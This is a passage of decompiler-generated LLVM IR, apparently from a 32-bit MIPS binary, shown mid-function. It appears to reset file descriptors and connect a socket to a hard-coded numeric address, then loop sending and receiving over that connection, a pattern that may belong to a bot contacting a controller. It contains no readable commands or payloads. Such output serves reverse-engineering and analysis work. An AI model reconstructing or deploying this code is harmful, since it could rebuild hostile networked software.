  %v3_4015a4 = load i32, i32* @global_var_449c38.91, align 4
  store i32 %v3_4015a4, i32* @t9, align 4
  %v5_4015ac = call i32 @function_404d80(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_408568.71, i32 0, i32 0))
  store i32 %v5_4015ac, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_4015bc = load i32, i32* @global_var_449cec.92, align 4
  store i32 %v3_4015bc, i32* @t9, align 4
  %v1_4015c4 = call i32 @function_40450c()
  store i32 %v1_4015c4, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_4015d4 = load i32, i32* @global_var_449cf0, align 4
  store i32 %v3_4015d4, i32* %v1.global-to-local, align 4
  %v3_4015d8 = load i32, i32* @global_var_449a80.88, align 4
  %v1_4015e0 = add i32 %v3_4015d8, 4868
  store i32 4199916, i32* @ra, align 4
  %v3_4015e4 = inttoptr i32 %v3_4015d4 to i32*
  store i32 %v1_4015c4, i32* %v3_4015e4, align 4
  call void @__pseudo_call(i32 %v1_4015e0)
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v1_4015f0 = icmp eq i32 %v1_4015c4, 0
  br i1 %v1_4015f0, label %dec_label_pc_4015f4, label %dec_label_pc_4016b0

dec_label_pc_4015f4:                              ; preds = %dec_label_pc_401520
  %v3_4015f8 = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_4015f8, i32* @t9, align 4
  %v2_401600 = call i32 @function_4002d0(i32 2)
  store i32 %v2_401600, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401610 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_401610, i32* @t9, align 4
  %v2_401618 = call i32 @function_400564(i32 2)
  store i32 %v2_401618, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401628 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_401628, i32* @t9, align 4
  store i32 %v2_401618, i32* @s0, align 4
  %v3_401630 = call i32 @function_400564(i32 2)
  store i32 %v3_401630, i32* @v0, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v2_401648 = call i32 @function_403f48()
  store i32 %v2_401648, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v0_401654 = load i32, i32* @s0, align 4
  store i32 %v0_401654, i32* %a1.global-to-local, align 4
  %v3_401658 = load i32, i32* @global_var_449c54.93, align 4
  store i32 %v3_401658, i32* @t9, align 4
  store i32 %v2_401648, i32* @a2, align 4
  %v3_401660 = inttoptr i32 %v0_401654 to i32*
  %v4_401660 = call i32 @function_405370(i32 1, i32* %v3_401660)
  store i32 %v4_401660, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_408840.94 to i32), i32* %a1.global-to-local, align 4
  %v3_401670 = load i32, i32* @global_var_449c54.93, align 4
  store i32 %v3_401670, i32* @t9, align 4
  store i32 1, i32* @a2, align 4
  %v4_401678 = call i32 @function_405370(i32 1, i32* nonnull @global_var_408840.94)
  store i32 %v4_401678, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401688 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_401688, i32* @t9, align 4
  %v2_401690 = call i32 @function_400418(i32 2)
  store i32 %v2_401690, i32* @v0, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_4016a0 = load i32, i32* @global_var_449b68.95, align 4
  store i32 %v3_4016a0, i32* @t9, align 4
  %v2_4016a8 = call i32 @function_4068c0(i32 0)
  store i32 %v2_4016a8, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4016b0

dec_label_pc_4016b0:                              ; preds = %dec_label_pc_401520, %dec_label_pc_4015f4
  %v3_4016b0 = load i32, i32* @global_var_449c28.96, align 4
  store i32 %v3_4016b0, i32* @t9, align 4
  %v1_4016b8 = call i32 @function_401e78()
  store i32 %v1_4016b8, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_4016c8 = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_4016c8, i32* @t9, align 4
  %v2_4016d0 = call i32 @function_4002d0(i32 1)
  store i32 %v2_4016d0, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_4016e0 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_4016e0, i32* @t9, align 4
  %v2_4016e8 = call i32 @function_400564(i32 1)
  store i32 %v2_4016e8, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_4016f8 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_4016f8, i32* @t9, align 4
  store i32 %v2_4016e8, i32* @s0, align 4
  %v3_401700 = call i32 @function_400564(i32 1)
  store i32 %v3_401700, i32* @v0, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v2_401718 = call i32 @function_403f48()
  store i32 %v2_401718, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v0_401724 = load i32, i32* @s0, align 4
  store i32 %v0_401724, i32* %a1.global-to-local, align 4
  %v3_401728 = load i32, i32* @global_var_449c54.93, align 4
  store i32 %v3_401728, i32* @t9, align 4
  store i32 %v2_401718, i32* @a2, align 4
  %v3_401730 = inttoptr i32 %v0_401724 to i32*
  %v4_401730 = call i32 @function_405370(i32 1, i32* %v3_401730)
  store i32 %v4_401730, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_408840.94 to i32), i32* %a1.global-to-local, align 4
  %v3_401740 = load i32, i32* @global_var_449c54.93, align 4
  store i32 %v3_401740, i32* @t9, align 4
  store i32 1, i32* @a2, align 4
  %v4_401748 = call i32 @function_405370(i32 1, i32* nonnull @global_var_408840.94)
  store i32 %v4_401748, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401758 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_401758, i32* @t9, align 4
  %v2_401760 = call i32 @function_400418(i32 1)
  store i32 %v2_401760, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401770 = load i32, i32* @global_var_449c00.97, align 4
  store i32 %v3_401770, i32* @t9, align 4
  %v1_401778 = call i32 @function_404e40()
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v1_401784 = icmp sgt i32 %v1_401778, 0
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v1_401784, label %dec_label_pc_401d40, label %dec_label_pc_401788

dec_label_pc_401788:                              ; preds = %dec_label_pc_4016b0
  %v3_40178c = load i32, i32* @global_var_449b30.98, align 4
  store i32 %v3_40178c, i32* @t9, align 4
  %v3_401794 = ptrtoint i32* %stack_var_-1348 to i32
  store i32 %v3_401794, i32* @s0, align 4
  %v4_401794 = call i32 @function_405250()
  store i32 %v4_401794, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_4017a4 = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_4017a4, i32* @t9, align 4
  store i32 %v4_401794, i32* @s1, align 4
  %v3_4017ac = call i32 @function_404de0(i32 0)
  store i32 %v3_4017ac, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_4017bc = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_4017bc, i32* @t9, align 4
  store i32 0, i32* @s6, align 4
  %v2_4017c4 = call i32 @function_404de0(i32 2)
  store i32 %v2_4017c4, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_4017d4 = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_4017d4, i32* @t9, align 4
  %v2_4017dc = call i32 @function_404de0(i32 1)
  store i32 %v2_4017dc, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  store i32 32, i32* @a2, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 %v3_401794, i32* @a0, align 4
  %v6_4017f4 = call i32 @function_404030(i32 %v3_401794, i32 0, i32 32)
  store i32 %v6_4017f4, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401808 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_401808, i32* @t9, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_408648.99 to i32), i32* %a1.global-to-local, align 4
  %v7_401810 = bitcast i32* %stack_var_-1348 to i8*
  %v8_401810 = call i32 @function_403fcc(i8* %v7_401810, i32 ptrtoint ([7 x i8]* @global_var_408648.99 to i32))
  store i32 %v8_401810, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401820 = load i32, i32* @global_var_449c74.100, align 4
  store i32 %v3_401820, i32* @t9, align 4
  %v1_401828 = call i32 @function_401d68()
  %v2_401828 = sext i32 %v1_401828 to i64
  %v5_401838 = mul nuw nsw i64 %v2_401828, 2863311531
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401844 = load i32, i32* @global_var_449c88.101, align 4
  store i32 %v3_401844, i32* @t9, align 4
  %v1_40184c2 = udiv i64 %v5_401838, 8589934592
  %v1_40184c = trunc i64 %v1_40184c2 to i32
  store i32 %v1_40184c, i32* %v1.global-to-local, align 4
  %v1_4018504 = mul nuw nsw i64 %v1_40184c2, 2
  %v1_401850 = trunc i64 %v1_4018504 to i32
  %v2_401854.neg = add i32 %v1_401828, 1
  %v3_401858 = sub i32 %v2_401854.neg, %v1_40184c
  %v1_40185c = sub i32 %v3_401858, %v1_401850
  store i32 %v1_40185c, i32* %v0.global-to-local, align 4
  %v2_401860 = urem i32 %v1_40185c, 256
  %v4_401860 = call i32 @function_4028e8(i32 %v2_401860)
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401870 = load i32, i32* @global_var_449a78.2, align 4
  store i32 %v3_401870, i32* @v0, align 4
  %v3_401874 = load i32, i32* @global_var_449b88.102, align 4
  store i32 %v3_401874, i32* @t9, align 4
  %v3_401878 = load i32, i32* @global_var_4498d4.6, align 4
  %v1_40187c = load i32, i32* @s1, align 4
  store i32 %v1_40187c, i32* %a1.global-to-local, align 4
  %v4_40187c = call i32 @function_403d2c(i32 %v3_401878, i32 %v1_40187c)
  store i32 %v4_40187c, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v2_401888 = ptrtoint i32* %stack_var_-1316 to i32
  %v2_40188c = ptrtoint i32* %stack_var_-1188 to i32
  %v2_4018a0 = ptrtoint i32* %stack_var_-1060 to i32
  %v2_40194c = ptrtoint i32* %stack_var_-1364 to i32
  %v4_401950 = bitcast i32* %stack_var_-1364 to %sockaddr*
  %v4_401970 = ptrtoint i16* %stack_var_-1384 to i32
  %v2_4019d0 = ptrtoint i32* %stack_var_-1372 to i32
  %v2_401ab8 = ptrtoint i32* %stack_var_-1376 to i32
  %v3_401acc = ptrtoint i32* %stack_var_-1380 to i32
  %v6_401b6c = bitcast i16* %stack_var_-1384 to i32*
  %v1_401bc8 = add i32 %v1_401528, 296524
  %v2_401bc8 = inttoptr i32 %v1_401bc8 to i32*
  br label %dec_label_pc_401888

dec_label_pc_401888:                              ; preds = %dec_label_pc_401c98, %dec_label_pc_401b94, %dec_label_pc_4018c8, %dec_label_pc_401788
  store i32 %v2_401888, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40188c

dec_label_pc_40188c:                              ; preds = %dec_label_pc_401ba0, %dec_label_pc_401b08, %dec_label_pc_401888
  store i32 %v2_40188c, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_401890

dec_label_pc_401890:                              ; preds = %dec_label_pc_401890, %dec_label_pc_40188c
  %v0_401890 = phi i32 [ %v1_401894, %dec_label_pc_401890 ], [ %v2_401888, %dec_label_pc_40188c ]
  %v1_401890 = inttoptr i32 %v0_401890 to i32*
  store i32 0, i32* %v1_401890, align 4
  %v0_401894 = load i32, i32* %v0.global-to-local, align 4
  %v1_401894 = add i32 %v0_401894, 4
  store i32 %v1_401894, i32* %v0.global-to-local, align 4
  %v1_401898 = load i32, i32* %v1.global-to-local, align 4
  %v2_401898 = icmp eq i32 %v1_401894, %v1_401898
  br i1 %v2_401898, label %dec_label_pc_40189c, label %dec_label_pc_401890

dec_label_pc_40189c:                              ; preds = %dec_label_pc_401890
  store i32 %v2_4018a0, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4018a4

dec_label_pc_4018a4:                              ; preds = %dec_label_pc_4018a4, %dec_label_pc_40189c
  %v0_4018a4 = phi i32 [ %v1_4018a8, %dec_label_pc_4018a4 ], [ %v1_401894, %dec_label_pc_40189c ]
  %v1_4018a4 = inttoptr i32 %v0_4018a4 to i32*
  store i32 0, i32* %v1_4018a4, align 4
  %v0_4018a8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4018a8 = add i32 %v0_4018a8, 4
  store i32 %v1_4018a8, i32* %v0.global-to-local, align 4
  %v1_4018ac = load i32, i32* %v1.global-to-local, align 4
  %v2_4018ac = icmp eq i32 %v1_4018a8, %v1_4018ac
  br i1 %v2_4018ac, label %dec_label_pc_4018b0, label %dec_label_pc_4018a4

dec_label_pc_4018b0:                              ; preds = %dec_label_pc_4018a4
  %v0_4018b4 = load i32, i32* %gp.global-to-local, align 4
  %v1_4018b4 = add i32 %v0_4018b4, -32744
  %v2_4018b4 = inttoptr i32 %v1_4018b4 to i32*
  %v3_4018b4 = load i32, i32* %v2_4018b4, align 4
  store i32 %v3_4018b4, i32* %s2.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v1_4018bc = add i32 %v3_4018b4, -26408
  %v2_4018bc = inttoptr i32 %v1_4018bc to i32*
  %v3_4018bc = load i32, i32* %v2_4018bc, align 4
  store i32 %v3_4018bc, i32* %s1.global-to-local, align 4
  %v2_4018c4 = icmp eq i32 %v3_4018bc, -1
  br i1 %v2_4018c4, label %dec_label_pc_4018c8, label %dec_label_pc_401960

dec_label_pc_4018c8:                              ; preds = %dec_label_pc_4018b0
  %v1_4018cc = add i32 %v0_4018b4, -32188
  %v2_4018cc = inttoptr i32 %v1_4018cc to i32*
  %v3_4018cc = load i32, i32* %v2_4018cc, align 4
  store i32 2, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018cc)
  %v0_4018dc = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4018dc, i32* @s0, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v1_4018e4 = load i32, i32* %s1.global-to-local, align 4
  %v2_4018e4 = icmp eq i32 %v0_4018dc, %v1_4018e4
  %v4_4018e4 = load i32, i32* %s2.global-to-local, align 4
  %v5_4018e4 = add i32 %v4_4018e4, -26408
  %v6_4018e4 = inttoptr i32 %v5_4018e4 to i32*
  store i32 %v0_4018dc, i32* %v6_4018e4, align 4
  br i1 %v2_4018e4, label %dec_label_pc_401888, label %dec_label_pc_4018e8

dec_label_pc_4018e8:                              ; preds = %dec_label_pc_4018c8
  %v3_4018ec = load i32, i32* @global_var_449b24.80, align 4
  store i32 %v3_4018ec, i32* @t9, align 4
  store i32 3, i32* @a1, align 4
  %v1_4018f8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_4018f8, i32* @a0, align 4
  %v2_4018f8 = call i32 @function_404c80()
  store i32 %v2_4018f8, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v0_401904 = load i32, i32* @s0, align 4
  store i32 %v0_401904, i32* @a0, align 4
  %v3_401908 = load i32, i32* @global_var_449b24.80, align 4
  store i32 %v3_401908, i32* @t9, align 4
  store i32 4, i32* @a1, align 4
  %v1_401910 = call i32 @function_404c80()
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  store i32 1, i32* %v1.global-to-local, align 4
  %v3_401924 = load i32, i32* @global_var_449d10.86, align 4
  store i32 %v3_401924, i32* @t9, align 4
  store i8 1, i8* @global_var_449d6c.104, align 1
  store i32 2, i32* %stack_var_-1364, align 4
  store i32 1488731833, i32* %v0.global-to-local, align 4
  %v0_401944 = load i32, i32* %s2.global-to-local, align 4
  %v1_401944 = add i32 %v0_401944, -26408
  %v2_401944 = inttoptr i32 %v1_401944 to i32*
  %v3_401944 = load i32, i32* %v2_401944, align 4
  store i32 %v2_40194c, i32* %a1.global-to-local, align 4
  store i32 16, i32* @a2, align 4
  %v5_401950 = call i32 @function_405cb0(i32 %v3_401944, %sockaddr* %v4_401950)
  store i32 %v5_401950, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v0_401964.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_401960

dec_label_pc_401960:                              ; preds = %dec_label_pc_4018b0, %dec_label_pc_4018e8
  %v0_401964 = phi i32 [ %v3_4018b4, %dec_label_pc_4018b0 ], [ %v0_401964.pre, %dec_label_pc_4018e8 ]
  %v0_401960 = phi i32 [ %v0_4018b4, %dec_label_pc_4018b0 ], [ %v2_401528, %dec_label_pc_4018e8 ]
  %v1_401960 = add i32 %v0_401960, -32744
  %v2_401960 = inttoptr i32 %v1_401960 to i32*
  %v3_401960 = load i32, i32* %v2_401960, align 4
  store i32 %v3_401960, i32* %v0.global-to-local, align 4
  %v1_401964 = add i32 %v0_401964, -26408
  %v2_401964 = inttoptr i32 %v1_401964 to i32*
  %v3_401964 = load i32, i32* %v2_401964, align 4
  store i32 %v3_401964, i32* %a1.global-to-local, align 4
  %v1_401968 = add i32 %v3_401960, -25236
  %v2_401968 = inttoptr i32 %v1_401968 to i8*
  %v3_401968 = load i8, i8* %v2_401968, align 1
  %v4_401968 = sext i8 %v3_401968 to i32
  store i32 %v4_401968, i32* %v0.global-to-local, align 4
  %v1_401970 = icmp eq i8 %v3_401968, 0
  store i32 %v4_401970, i32* %v1.global-to-local, align 4
  br i1 %v1_401970, label %dec_label_pc_40199c, label %dec_label_pc_401974

dec_label_pc_401974:                              ; preds = %dec_label_pc_401960
  %v1_401978 = udiv i32 %v3_401964, 32
  %v1_40197c = mul nuw nsw i32 %v1_401978, 4
  %v2_401980 = add i32 %v1_40197c, %v4_401970
  store i32 %v2_401980, i32* %v0.global-to-local, align 4
  %v1_401984 = add i32 %v2_401980, 196
  %v2_401984 = inttoptr i32 %v1_401984 to i32*
  %v3_401984 = load i32, i32* %v2_401984, align 4
  %v2_40198c = shl i32 1, %v3_401964
  store i32 %v2_40198c, i32* %v1.global-to-local, align 4
  %v2_401990 = or i32 %v3_401984, %v2_40198c
  store i32 %v2_401990, i32* %v2_401984, align 4
  %v0_40199c.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_4019a4.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_40199c

dec_label_pc_40199c:                              ; preds = %dec_label_pc_401960, %dec_label_pc_401974
  %v1_4019a4 = phi i32 [ %v4_401970, %dec_label_pc_401960 ], [ %v1_4019a4.pre, %dec_label_pc_401974 ]
  %v1_4019b0 = phi i32 [ %v3_401964, %dec_label_pc_401960 ], [ %v0_40199c.pre, %dec_label_pc_401974 ]
  %v1_40199c = udiv i32 %v1_4019b0, 32
  %v1_4019a0 = mul nuw nsw i32 %v1_40199c, 4
  %v2_4019a4 = add i32 %v1_4019a0, %v1_4019a4
  store i32 %v2_4019a4, i32* %v0.global-to-local, align 4
  %v1_4019a8 = add i32 %v2_4019a4, 68
  %v2_4019a8 = inttoptr i32 %v1_4019a8 to i32*
  %v3_4019a8 = load i32, i32* %v2_4019a8, align 4
  %v2_4019b0 = shl i32 1, %v1_4019b0
  store i32 %v2_4019b0, i32* %v1.global-to-local, align 4
  %v2_4019b4 = or i32 %v3_4019a8, %v2_4019b0
  store i32 %v2_4019b4, i32* %v2_4019a8, align 4
  %v0_4019bc = load i32, i32* %gp.global-to-local, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  %v1_4019c8 = add i32 %v0_4019bc, -32192
  %v2_4019c8 = inttoptr i32 %v1_4019c8 to i32*
  %v3_4019c8 = load i32, i32* %v2_4019c8, align 4
  store i32 10, i32* %stack_var_-1372, align 4
  store i32 %v2_4019d0, i32* %v0.global-to-local, align 4
  store i32 %v2_401888, i32* %a1.global-to-local, align 4
  store i32 0, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_4019c8)
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401a5c = load i32, i32* @global_var_449a78.2, align 4
  store i32 %v3_401a5c, i32* %v1.global-to-local, align 4
  %v3_401a64 = load i8, i8* @global_var_449d6c.104, align 1
  %v4_401a64 = sext i8 %v3_401a64 to i32
  store i32 %v4_401a64, i32* %v0.global-to-local, align 4
  %v1_401a6c = icmp eq i8 %v3_401a64, 0
  store i32 -1, i32* %s5.global-to-local, align 4
  %v3_401b94.pre = load i32, i32* @global_var_4498d8.107, align 4
  br i1 %v1_401a6c, label %dec_label_pc_401b94, label %dec_label_pc_401a70

dec_label_pc_401a70:                              ; preds = %dec_label_pc_40199c
  %v1_401a7c = udiv i32 %v3_401b94.pre, 32
  %v1_401a80 = mul nuw nsw i32 %v1_401a7c, 4
  %v2_401a84 = add i32 %v1_401a80, %v4_401970
  store i32 %v2_401a84, i32* %v0.global-to-local, align 4
  %v1_401a88 = add i32 %v2_401a84, 196
  %v2_401a88 = inttoptr i32 %v1_401a88 to i32*
  %v3_401a88 = load i32, i32* %v2_401a88, align 4
  %v2_401a906 = lshr i32 %v3_401a88, %v3_401b94.pre
  %v1_401a94 = urem i32 %v2_401a906, 2
  store i32 %v1_401a94, i32* %v0.global-to-local, align 4
  %v1_401a98 = icmp eq i32 %v1_401a94, 0
  store i8 0, i8* @global_var_449d6c.104, align 1
  br i1 %v1_401a98, label %dec_label_pc_401a9c, label %dec_label_pc_401aac

dec_label_pc_401a9c:                              ; preds = %dec_label_pc_401a70
  br label %dec_label_pc_401aac

dec_label_pc_401aac:                              ; preds = %dec_label_pc_401a70, %dec_label_pc_401a9c
  %v3_401ab0 = load i32, i32* @global_var_449b90.108, align 4
  store i32 %v3_401ab0, i32* @t9, align 4
  store i32 4, i32* %stack_var_-1376, align 4
  store i32 %v2_401ab8, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-1380, align 4
  store i32 65535, i32* %a1.global-to-local, align 4
  store i32 %v3_401acc, i32* @a3, align 4
  %v7_401acc = call i32 @function_405d70(i32 65535, i32 4103, i32 %v3_401acc)
  %v3_401ad4 = load i32, i32* %stack_var_-1380, align 4
  store i32 %v3_401ad4, i32* @v0, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v1_401adc = icmp eq i32 %v3_401ad4, 0
  store i32 %v3_401794, i32* @s0, align 4
  br i1 %v1_401adc, label %dec_label_pc_401b08, label %dec_label_pc_401ae0

dec_label_pc_401ae0:                              ; preds = %dec_label_pc_401aac
  %v3_401ae4 = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_401ae4, i32* @t9, align 4
  %v3_401ae8 = load i32, i32* @global_var_4498d8.107, align 4
  %v2_401aec = call i32 @function_404de0(i32 %v3_401ae8)
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  store i32 -1, i32* @v0, align 4
  store i32 -1, i32* @global_var_4498d8.107, align 4
  br label %dec_label_pc_401b08

dec_label_pc_401b08:                              ; preds = %dec_label_pc_401aac, %dec_label_pc_401ae0
  %v3_401b10 = call i32 @function_403f48()
  store i32 %v3_401b10, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401b20 = load i32, i32* @global_var_449cec.92, align 4
  store i32 %v3_401b20, i32* @t9, align 4
  %sext = mul i32 %v3_401b10, 16777216
  %v2_401b28 = sdiv i32 %sext, 16777216
  %v8_401b28 = trunc i32 %v2_401b28 to i16
  store i16 %v8_401b28, i16* %stack_var_-1384, align 2
  %v9_401b28 = call i32 @function_40450c()
  store i32 %v9_401b28, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401b34 = load i32, i32* @global_var_4498d8.107, align 4
  %v3_401b38 = load i32, i32* @global_var_449cf0, align 4
  store i32 %v3_401b38, i32* %v1.global-to-local, align 4
  %v3_401b40 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_401b40, i32* @t9, align 4
  %v2_401b44 = inttoptr i32 %v3_401b38 to i32*
  store i32 %v9_401b28, i32* %v2_401b44, align 4
  store i32 ptrtoint (i32* @global_var_408650.109 to i32), i32* %a1.global-to-local, align 4
  %v7_401b50 = call i32 @function_405f30(i32 %v3_401b34, i32* nonnull @global_var_408650.109, i32 4, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_401b50, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401b5c = load i32, i32* @global_var_4498d8.107, align 4
  %v3_401b60 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_401b60, i32* @t9, align 4
  store i32 %v4_401970, i32* %a1.global-to-local, align 4
  %v7_401b6c = call i32 @function_405f30(i32 %v3_401b5c, i32* %v6_401b6c, i32 1, i32 16384, i32 ptrtoint (i32* @0 to i32))
  %v3_401b74 = load i16, i16* %stack_var_-1384, align 2
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v1_401b7c = icmp eq i16 %v3_401b74, 0
  store i32 %v2_401888, i32* %v0.global-to-local, align 4
  br i1 %v1_401b7c, label %dec_label_pc_40188c, label %dec_label_pc_401b80

dec_label_pc_401b80:                              ; preds = %dec_label_pc_401b08
  %v3_401b84 = load i32, i32* @global_var_4498d8.107, align 4
  store i32 %v3_401794, i32* %a1.global-to-local, align 4
  %v1_401b9c.pre = load i32, i32* %s5.global-to-local, align 4
  br label %dec_label_pc_401b94

dec_label_pc_401b94:                              ; preds = %dec_label_pc_40199c, %dec_label_pc_401b80
  %v1_401b9c = phi i32 [ %v1_401b9c.pre, %dec_label_pc_401b80 ], [ -1, %dec_label_pc_40199c ]
  %v1_401bb8 = phi i32 [ %v3_401b84, %dec_label_pc_401b80 ], [ %v3_401b94.pre, %dec_label_pc_40199c ]
  store i32 %v1_401bb8, i32* @s0, align 4
  %v2_401b9c = icmp eq i32 %v1_401bb8, %v1_401b9c
  %v4_401b9c = udiv i32 %v1_401bb8, 32
  store i32 %v4_401b9c, i32* %v0.global-to-local, align 4
  br i1 %v2_401b9c, label %dec_label_pc_401888, label %dec_label_pc_401ba0

dec_label_pc_401ba0:                              ; preds = %dec_label_pc_401b94
  %v1_401ba4 = mul nuw nsw i32 %v4_401b9c, 4
  %v2_401bac = add i32 %v1_401ba4, %v4_401970
  store i32 %v2_401bac, i32* %v0.global-to-local, align 4
  %v1_401bb0 = add i32 %v2_401bac, 68
  %v2_401bb0 = inttoptr i32 %v1_401bb0 to i32*
  %v3_401bb0 = load i32, i32* %v2_401bb0, align 4
  %tmp61 = shl i32 1, %v1_401bb8
  %v1_401bbc8 = and i32 %v3_401bb0, %tmp61
  %v1_401bc0 = icmp eq i32 %v1_401bbc8, 0
  store i32 %v2_401888, i32* %v0.global-to-local, align 4
  br i1 %v1_401bc0, label %dec_label_pc_40188c, label %dec_label_pc_401bc4

dec_label_pc_401bc4:                              ; preds = %dec_label_pc_401ba0
  %v3_401bc8 = load i32, i32* %v2_401bc8, align 4
  store i16 0, i16* %stack_var_-1384, align 2
  call void @__pseudo_call(i32 %v3_401bc8)
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v0_401bdc = load i32, i32* @s0, align 4
  %v3_401be0 = load i32, i32* @global_var_449d14.110, align 4
  store i32 %v3_401be0, i32* @t9, align 4
  store i32 0, i32* %stack_var_-1316, align 4
  store i32 %v4_401970, i32* %a1.global-to-local, align 4
  %v9_401bf4 = call i32 @function_405e50(i32 %v0_401bdc, i32* %v6_401b6c, i32 2, i32 16386, i32 0)
  store i32 %v9_401bf4, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v1_401c00 = load i32, i32* %s5.global-to-local, align 4
  %v2_401c00 = icmp eq i32 %v9_401bf4, %v1_401c00
  br i1 %v2_401c00, label %dec_label_pc_401c98, label %dec_label_pc_401c04

dec_label_pc_401c04:                              ; preds = %dec_label_pc_401bc4
  %v1_401c08 = icmp eq i32 %v9_401bf4, 0
  br i1 %v1_401c08, label %dec_label_pc_401cc0, label %dec_label_pc_401c0c

dec_label_pc_401c0c:                              ; preds = %dec_label_pc_401c04
  %v3_401c10 = load i16, i16* %stack_var_-1384, align 2
  %v4_401c10 = sext i16 %v3_401c10 to i32
  store i32 %v4_401c10, i32* %v1.global-to-local, align 4
  %v1_401c18 = icmp eq i16 %v3_401c10, 0
  %v3_401c18 = urem i32 %v4_401c10, 256
  store i32 %v3_401c18, i32* %v0.global-to-local, align 4
  br i1 %v1_401c18, label %dec_label_pc_401c1c, label %dec_label_pc_401c34

dec_label_pc_401c1c:                              ; preds = %dec_label_pc_401c0c
  store i32 %v4_401970, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_401c34

dec_label_pc_401c34:                              ; preds = %dec_label_pc_401c0c, %dec_label_pc_401c1c
  %v1_401c34 = mul nuw nsw i32 %v3_401c18, 256
  %v1_401c38 = udiv i32 %v4_401c10, 256
